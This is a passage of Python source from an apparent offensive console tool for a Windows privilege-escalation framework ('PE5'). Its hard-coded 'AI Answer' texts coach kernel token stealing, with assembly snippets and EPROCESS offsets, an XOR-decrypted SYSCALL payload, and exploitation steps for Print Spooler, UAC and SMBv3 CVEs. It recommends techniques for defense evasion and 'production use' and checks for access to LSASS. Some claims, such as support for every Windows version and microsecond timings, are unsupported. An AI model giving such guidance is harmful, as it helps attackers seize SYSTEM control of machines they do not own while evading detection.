                'a': self._get_pe5_overview_guidance()
            },
            '2': {
                'q': 'Which technique should I use?',
                'a': self._get_technique_selection_guidance()
            },
            '3': {
                'q': 'How do I verify SYSTEM privileges?',
                'a': self._get_verification_guidance()
            },
            '4': {
                'q': 'What are the Windows version requirements?',
                'a': self._get_version_requirements_guidance()
            },
            '5': {
                'q': 'How do I build the PE5 framework?',
                'a': self._get_build_guidance()
            }
        }
        
        console.print("[bold]Common Questions:[/bold]\n")
        for key, qa in common_questions.items():
            console.print(f"  {key}. {qa['q']}")
        console.print("  6. Ask custom question")
        console.print()
        
        q_choice = Prompt.ask(
            "[bold cyan]Select question[/bold cyan]",
            choices=['1', '2', '3', '4', '5', '6'],
            default='1'
        )
        
        if q_choice == '6':
            custom_q = Prompt.ask("\n[bold]Enter your question[/bold]")
            answer = self._answer_custom_question(custom_q, console, session_data)
            console.print(Panel(answer, title="AI Answer", border_style="green"))
        else:
            qa = common_questions[q_choice]
            console.print(f"\n[bold cyan]Q: {qa['q']}[/bold cyan]\n")
            console.print(Panel(qa['a'], title="AI Answer", border_style="green"))
    
    def _quick_reference(self, console: Console, session_data: dict):
        """Quick reference guide"""
        console.print("\n[bold cyan]📖 Quick Reference Guide[/bold cyan]\n")
        
        ref_table = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
        ref_table.add_column("Function", style="white", width=25)
        ref_table.add_column("Usage", style="dim white", width=50)
        ref_table.add_column("Example", style="dim yellow", width=30)
        
        references = [
            ("PE5 Mechanism", "View complete technical breakdown", "Select option 1 → Review timeline"),
            ("Token Manipulation", "Learn 4 exploitation techniques", "Select option 2 → Choose technique"),
            ("Token Stealing", "Understand SYSTEM token theft", "Select option 3 → Review shellcode"),
            ("SYSCALL Execution", "Learn kernel transition", "Select option 4 → Study flow"),
            ("Windows PE", "Additional PE methods", "Select option 5 → Browse techniques"),
            ("Print Spooler", "CVE-2020-1337 exploit", "Select option 6 → Check service"),
            ("UAC Bypass", "CVE-2019-1388 methods", "Select option 7 → Review steps"),
            ("SMBv3 PE", "CVE-2020-0796 exploit", "Select option 8 → Check version"),
            ("Verify Privileges", "Post-exploitation check", "Select option 9 → Run checks"),
            ("Generate Report", "Create PE report", "Select option 10 → Save JSON")
        ]
        
        for func, usage, example in references:
            ref_table.add_row(func, usage, example)
        
        console.print(ref_table)
        console.print()
        
        console.print("[bold]Quick Commands:[/bold]\n")
        commands = [
            ("Check current privileges", "whoami /priv"),
            ("Verify SYSTEM user", "whoami /user"),
            ("Check Print Spooler", "Get-Service Spooler"),
            ("Windows version", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""),
            ("List privileges", "whoami /priv"),
            ("Check UAC status", "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
        ]
        
        cmd_table = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan")
        cmd_table.add_column("Purpose", style="white", width=30)
        cmd_table.add_column("Command", style="dim yellow", width=60)
        
        for purpose, cmd in commands:
            cmd_table.add_row(purpose, cmd)
        
        console.print(cmd_table)
        console.print()
        
        if Confirm.ask("[bold]View detailed usage examples?[/bold]", default=False):
            self._detailed_examples(console, session_data)
    
    def _contextual_help(self, console: Console, session_data: dict, function_num: str):
        """Contextual help for specific function"""
        help_map = {
            '1': self._get_pe5_overview_guidance(),
            '2': self._get_token_manipulation_guidance(),
            '3': self._get_token_stealing_guidance(),
            '4': self._get_syscall_guidance(),
            '5': self._get_windows_pe_guidance(),
            '6': self._get_print_spooler_guidance(),
            '7': self._get_uac_bypass_guidance(),
            '8': self._get_smbv3_guidance(),
            '9': self._get_verification_guidance(),
            '10': self._get_report_guidance()
        }
        
        help_text = help_map.get(function_num, "Help not available for this function.")
        console.print(Panel(help_text, title="Contextual Help", border_style="cyan"))
    
    def _step_by_step_guide(self, console: Console, session_data: dict, topic: str):
        """Step-by-step guide for specific topic"""
        console.print(f"\n[bold cyan]📋 Step-by-Step Guide[/bold cyan]\n")
        
        guides = {
            '1': self._pe5_step_by_step(),
            '2': self._token_manipulation_steps(),
            '3': self._token_stealing_steps(),
            '6': self._print_spooler_steps(),
            '7': self._uac_bypass_steps(),
            '9': self._verification_steps()
        }
        
        guide = guides.get(topic, "Step-by-step guide not available for this topic.")
        console.print(Panel(guide, border_style="green"))
    
    # Guidance content methods
    def _get_pe5_overview_guidance(self) -> str:
        return """The PE5 exploit achieves SYSTEM privileges through kernel-level token manipulation.

KEY CONCEPTS:
• User Mode (Ring 3) → Kernel Mode (Ring 0) transition via SYSCALL
• Direct modification of _EPROCESS.Token structure in kernel memory
• XOR key derivation: header[3] ^ header[7] = 0xA4
• SYSCALL instruction at offset 0x2C10 triggers kernel vulnerability
• Token.Privileges modified to grant all privileges (0xFFFFFFFFFFFFFFFF)

EXECUTION FLOW:
1. PE5 payload injected into memory
2. Runtime XOR decryption (key: 0xA4)
3. SYSCALL execution transitions to kernel mode
4. Kernel vulnerability exploited
5. Token privileges modified directly in kernel memory
6. Return to user mode with SYSTEM privileges

TOTAL TIME: ~10 microseconds

This is the fastest and most reliable privilege escalation method."""
    
    def _get_token_manipulation_guidance(self) -> str:
        return """Four exploitation techniques available, each with different characteristics:

1. DIRECT PRIVILEGE MODIFICATION (Fastest)
   • Speed: ~1 microsecond
   • Reliability: High
   • Detection: Medium
   • Use when: Speed is critical

2. TOKEN STEALING (Most Reliable)
   • Speed: ~2 microseconds
   • Reliability: Very High
   • Detection: Low
   • Use when: Maximum reliability needed

3. INTEGRITY LEVEL ELEVATION
   • Speed: ~1.5 microseconds
   • Reliability: High
   • Detection: Medium
   • Use when: Need System integrity level

4. FULL TOKEN TAKEOVER (Most Complete)
   • Speed: ~3 microseconds
   • Reliability: Very High
   • Detection: Low
   • Use when: Complete token manipulation needed

RECOMMENDATION: Start with Token Stealing for best reliability."""
    
    def _get_token_stealing_guidance(self) -> str:
        return """SYSTEM Token Stealing walks the ActiveProcessLinks list to find PID 4.

PROCESS:
1. Get current EPROCESS via GS:[0x188]
2. Walk ActiveProcessLinks doubly-linked list
3. Check UniqueProcessId for each process
4. When PID == 4 (SYSTEM), extract token
5. Copy SYSTEM token to current process
6. Set reference count appropriately

SHELLCODE SIZE: ~70 bytes
RELIABILITY: Very High (works across Windows versions)

ADVANTAGES:
• Uses known-good SYSTEM token
• More reliable than direct modification
• Works across different Windows versions
• Lower detection risk

This is the recommended technique for production use."""
    
    def _get_syscall_guidance(self) -> str:
        return """SYSCALL instruction provides direct kernel mode transition.

MECHANISM:
• SYSCALL bypasses Windows API layer
• Direct transition from Ring 3 to Ring 0
• No API hooks, no user-mode detection
• Kernel vulnerability triggered in kernel context

LOCATION:
• Offset: 0x2C10 in PE5 module
• Encrypted: 0xAB 0xA1
• XOR Key: 0xA4
• Decrypted: 0x0F 0x05 (SYSCALL instruction)

PARAMETERS:
• RAX: Syscall number (encrypted, decrypted at runtime)
• RCX, RDX, R8, R9: Parameters
• All parameters encrypted and decrypted dynamically

SECURITY IMPLICATIONS:
• Kernel-level exploits are extremely powerful
• Can bypass all user-mode security controls
• Difficult to detect without kernel-mode monitoring
• Requires kernel vulnerability (0-day or unpatched)

This is the core mechanism enabling PE5 exploitation."""
    
    def _get_windows_pe_guidance(self) -> str:
        return """Additional Windows privilege escalation techniques from post-hub repository.

AVAILABLE TECHNIQUES:
• Print Spooler Exploit (CVE-2020-1337)
• UAC Bypass (CVE-2019-1388)
• SMBv3 Local PE (CVE-2020-0796)
• Token Manipulation (SeDebugPrivilege abuse)
• Service Abuse (unquoted paths, weak permissions)
• DLL Hijacking (path-based loading)
• Registry Abuse (AlwaysInstallElevated, etc.)
• Scheduled Task Abuse

WHEN TO USE:
• PE5 kernel exploit not available
• Need alternative escalation methods
• Testing different attack vectors
• Defense evasion requirements

These techniques complement the primary PE5 method."""
    
    def _get_print_spooler_guidance(self) -> str:
        return """Print Spooler Exploit (CVE-2020-1337) - PrintDemon vulnerability.

EXPLOITATION:
1. Check if Print Spooler service is running
2. Create malicious print job
3. Trigger arbitrary file write
4. Write to system directory for privilege escalation

AFFECTED VERSIONS:
• Windows 7/8.1/10
• Windows Server 2008-2019

CHECK SERVICE:
Get-Service -Name Spooler

MITIGATION:
• Patch KB4560960 (Windows 10)
• Patch KB4560959 (Windows 8.1)
• Patch KB4560961 (Windows 7)
• Disable Print Spooler if not needed

This is a user-mode exploit, easier to detect than kernel exploits."""
    
    def _get_uac_bypass_guidance(self) -> str:
        return """UAC Bypass (CVE-2019-1388) - Windows Certificate Dialog vulnerability.

EXPLOITATION:
1. Trigger certificate dialog
2. Click 'Show publisher certificate' link
3. Navigate to file:/// path
4. Execute hhupd.exe with elevated privileges
5. Bypass UAC without prompt

AFFECTED VERSIONS:
• Windows 7/8.1/10

MITIGATION:
• Patch KB4525236 (Windows 10)
• Patch KB4525237 (Windows 8.1)
• Patch KB4525233 (Windows 7)
• Disable UAC bypass for standard users

This technique bypasses UAC but doesn't grant SYSTEM privileges."""
    
    def _get_smbv3_guidance(self) -> str:
        return """SMBv3 Local PE (CVE-2020-0796) - SMBv3 compression vulnerability.

EXPLOITATION:
1. Craft malicious SMBv3 compression packet
2. Trigger buffer overflow
3. Execute shellcode with SYSTEM privileges

AFFECTED VERSIONS:
• Windows 10 Version 1903
• Windows 10 Version 1909
• Windows Server Version 1903
• Windows Server Version 1909

MITIGATION:
• Patch KB4551762
• Disable SMBv3 compression
• Block SMB ports at firewall

This is a local privilege escalation exploit."""
    
    def _get_verification_guidance(self) -> str:
        return """Verify SYSTEM privileges after exploitation.

CHECKS TO PERFORM:
1. Check current user SID (should be S-1-5-18 for SYSTEM)
2. Verify administrator status
3. Check elevated token privileges
4. Try accessing protected resources (HKLM registry)
5. Check SeDebugPrivilege status
6. Verify can access LSASS process

COMMANDS:
• whoami /user (check SID)
• whoami /priv (list privileges)
• PowerShell: Check token properties
• Try accessing HKLM\\SYSTEM registry key

SUCCESS INDICATORS:
• User SID = S-1-5-18
• IsAdministrator = True
• HasElevatedPrivileges = True
• Can access protected resources

Always verify privileges after exploitation."""
    
    def _get_report_guidance(self) -> str:
        return """Generate comprehensive privilege escalation report.

REPORT INCLUDES:
• System information (hostname, OS version)
• Current user and SID
• SYSTEM status
• Administrator status
• Elevated privileges status
• Print Spooler service status
• UAC status

OUTPUT FORMAT:
• JSON format for easy parsing
• Can be saved to file
• Includes all relevant system information

USAGE:
1. Select option 10
2. Review generated report
3. Save to file if needed
4. Use for documentation and analysis

The report provides a complete snapshot of privilege escalation status."""
    
    def _get_technique_selection_guidance(self) -> str:
        return """Technique selection depends on your requirements:

FOR MAXIMUM RELIABILITY:
→ Use Token Stealing (option 3)
→ Works across Windows versions
→ Uses known-good SYSTEM token

FOR MAXIMUM SPEED:
→ Use Direct Privilege Modification (option 2, technique 1)
→ Fastest execution (~1 microsecond)

FOR COMPLETE CONTROL:
→ Use Full Token Takeover (option 2, technique 4)
→ Most comprehensive token manipulation

FOR DEFENSE EVASION:
→ Use Token Stealing or Full Token Takeover
→ Lower detection risk

GENERAL RECOMMENDATION:
Start with Token Stealing for best balance of reliability and stealth."""
    
    def _get_version_requirements_guidance(self) -> str:
        return """Windows version support and kernel offsets:

SUPPORTED VERSIONS:
• Windows 10 (all versions)
• Windows 11 (all versions)
• Windows Server 2019
• Windows Server 2022

KERNEL OFFSETS:
• Windows 10 1909 / Server 2019: Token @ 0x360
• Windows 10 2004+ / 11 / Server 2022: Token @ 0x4B8

AUTOMATIC DETECTION:
The framework automatically detects Windows version and uses correct offsets.

REQUIREMENTS:
• x64 architecture
• Kernel vulnerability (0-day or unpatched)
• Ability to execute kernel-mode code

Check Windows version with: systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""""
    
    def _get_build_guidance(self) -> str:
        return """Build PE5 framework from source:

METHOD 1: Python Build Script (Recommended)
cd pe5_framework_extracted/pe5_framework
python build.py all

METHOD 2: Windows Batch Script
cd pe5_framework_extracted/pe5_framework
build.bat all

METHOD 3: CMake
cd pe5_framework_extracted/pe5_framework
mkdir build && cd build
cmake .. -G \"Visual Studio 17 2022\" -A x64
cmake --build . --config Release

METHOD 4: NMAKE
cd pe5_framework_extracted/pe5_framework
nmake all

REQUIREMENTS:
• Visual Studio 2019/2022 with C++ Desktop Development
• Or MinGW-w64 for cross-compilation

OUTPUT:
Build binaries in build/bin/ directory."""
    
    def _answer_custom_question(self, question: str, console: Console, session_data: dict) -> str:
        """Answer custom question using AI guidance"""
        question_lower = question.lower()
        
        # Simple keyword-based guidance (in production, this would use actual LLM)
        if 'build' in question_lower or 'compile' in question_lower:
            return self._get_build_guidance()
        elif 'technique' in question_lower or 'which' in question_lower or 'choose' in question_lower:
            return self._get_technique_selection_guidance()
        elif 'verify' in question_lower or 'check' in question_lower:
            return self._get_verification_guidance()
        elif 'version' in question_lower or 'windows' in question_lower:
            return self._get_version_requirements_guidance()
        elif 'token' in question_lower:
            return self._get_token_stealing_guidance()
        elif 'syscall' in question_lower or 'kernel' in question_lower:
            return self._get_syscall_guidance()
        else:
            return f"""Based on your question: "{question}"

I recommend:
1. Review the PE5 Kernel Exploit Mechanism (option 1) for technical details
2. Check Token Manipulation Techniques (option 2) for exploitation methods
3. Use AI Guidance (option h) for interactive help
4. Consult Quick Reference (option ?) for commands and examples

For specific questions, try:
• "How do I build?" → Build guidance
• "Which technique?" → Technique selection guidance
• "How do I verify?" → Verification guidance
• "Windows version?" → Version requirements guidance"""
    
    def _detailed_examples(self, console: Console, session_data: dict):
        """Show detailed usage examples"""
        console.print("\n[bold cyan]📚 Detailed Usage Examples[/bold cyan]\n")
        
        examples = [
            ("Example 1: Check Current Privileges", 
             "whoami /priv\nwhoami /user\nwhoami /groups"),
            ("Example 2: Verify SYSTEM User",
             "PowerShell:\n$token = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n$token.User.Value -eq 'S-1-5-18'"),
            ("Example 3: Check Print Spooler",
             "Get-Service -Name Spooler | Select-Object Name, Status, StartType"),
            ("Example 4: Check Windows Version",
             "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""),
            ("Example 5: Access Protected Resource",
             "PowerShell:\n$reg = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SYSTEM\\CurrentControlSet\\Control\\Lsa')")
        ]
        
        for title, example in examples:
            console.print(f"[bold]{title}:[/bold]")
            console.print(Panel(example, border_style="dim"))
            console.print()
    
    def _pe5_step_by_step(self) -> str:
        return """STEP-BY-STEP: PE5 Exploit Execution

STEP 1: Prepare Environment
• Ensure you have PE5 framework compiled
• Verify Windows version compatibility
• Check current privileges (whoami /priv)

STEP 2: Inject PE5 Payload
• PE5 payload injected into target process memory
• Payload is XOR encrypted (key: 0xA4)

STEP 3: Runtime Decryption
• Derive XOR key: header[3] ^ header[7] = 0xA4
• Decrypt payload in memory
• Verify SYSCALL bytes at offset 0x2C10

STEP 4: Execute SYSCALL
• Load syscall parameters into registers
• Execute SYSCALL instruction
• Transition from Ring 3 to Ring 0

STEP 5: Kernel Exploitation
• Kernel vulnerability triggered
• Execute kernel-mode shellcode
• Modify TOKEN.Privileges structure

STEP 6: Return to User Mode
• Return from kernel mode
• Process now has SYSTEM privileges
• Verify with whoami /priv

STEP 7: Verification
• Check user SID (should be S-1-5-18)
• Verify elevated privileges
• Test access to protected resources"""
    
    def _token_manipulation_steps(self) -> str:
        return """STEP-BY-STEP: Token Manipulation

STEP 1: Choose Technique
• Direct Modification (fastest)
• Token Stealing (most reliable)
• Integrity Elevation (balanced)
• Full Takeover (most complete)

STEP 2: Get Current EPROCESS
• Use GS:[0x188] to get current thread
• Read KTHREAD.Process to get EPROCESS

STEP 3: Access Token
• Read EPROCESS.Token (offset 0x4B8)
• Clear reference count bits (mask 0xFFFFFFFFFFFFFFF0)

STEP 4: Modify Privileges
• For Direct Modification: Write 0xFFFFFFFFFFFFFFFF to Privileges
• For Token Stealing: Copy SYSTEM token from PID 4
• For Integrity Elevation: Set integrity level to System
• For Full Takeover: Complete token manipulation

STEP 5: Verify Changes
• Check token privileges
• Verify SYSTEM status
• Test protected resource access"""
    
    def _token_stealing_steps(self) -> str:
        return """STEP-BY-STEP: SYSTEM Token Stealing

STEP 1: Get Current EPROCESS
• mov rax, gs:[0x188]  ; Get current thread
• mov rax, [rax+0xB8]  ; Get EPROCESS

STEP 2: Walk Process List
• Start from current EPROCESS
• Follow ActiveProcessLinks.Flink
• Check UniqueProcessId for each process

STEP 3: Find SYSTEM Process
• Look for PID == 4 (SYSTEM process)
• Continue walking until found
• Handle circular list properly

STEP 4: Extract SYSTEM Token
• Read Token from SYSTEM EPROCESS
• Clear reference count bits
• Store token value

STEP 5: Copy Token to Current Process
• Write SYSTEM token to current EPROCESS.Token
• Set appropriate reference count
• Ensure token validity

STEP 6: Verify Success
• Check current process token
• Verify SYSTEM privileges
• Test protected resource access"""
    
    def _print_spooler_steps(self) -> str:
        return """STEP-BY-STEP: Print Spooler Exploit

STEP 1: Check Service Status
• Get-Service -Name Spooler
• Verify service is running
• Check service permissions

STEP 2: Create Malicious Print Job
• Craft print job with arbitrary file path
• Target system directory for privilege escalation
• Use PrintDemon technique

STEP 3: Trigger File Write
• Submit print job to spooler
• Exploit arbitrary file write vulnerability
• Write payload to system directory

STEP 4: Execute Payload
• Payload written with SYSTEM privileges
• Execute payload for privilege escalation
• Verify elevated privileges

STEP 5: Cleanup
• Remove print job
• Clear spooler queue
• Remove temporary files"""
    
    def _uac_bypass_steps(self) -> str:
        return """STEP-BY-STEP: UAC Bypass

STEP 1: Trigger Certificate Dialog
• Open file that triggers certificate dialog
• Or use specific file type

STEP 2: Navigate to Link
• Click 'Show publisher certificate' link
• This opens file browser

STEP 3: Navigate to file:/// Path
• Enter file:/// path in address bar
• Navigate to target location

STEP 4: Execute hhupd.exe
• hhupd.exe executes with elevated privileges
• Bypasses UAC prompt
• Runs with administrator privileges

STEP 5: Verify Elevation
• Check if running as administrator
• Verify elevated token
• Note: This grants admin, not SYSTEM"""
    
    def _verification_steps(self) -> str:
        return """STEP-BY-STEP: Privilege Verification

STEP 1: Check User Identity
• whoami /user (check SID)
• whoami (check username)
• Should show SYSTEM or elevated user

STEP 2: Check Privileges
• whoami /priv (list all privileges)
• Look for SeDebugPrivilege
• Check for SeTcbPrivilege

STEP 3: PowerShell Verification
• $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
• Check $token.User.Value == 'S-1-5-18' (SYSTEM)
• Check $token.Token.HasElevatedPrivileges

STEP 4: Test Protected Resources
• Try accessing HKLM\\SYSTEM registry
• Try accessing LSASS process
• Try accessing protected files

STEP 5: Verify Specific Privileges
• Check SeDebugPrivilege status
• Verify can access protected processes
• Test administrative operations"""
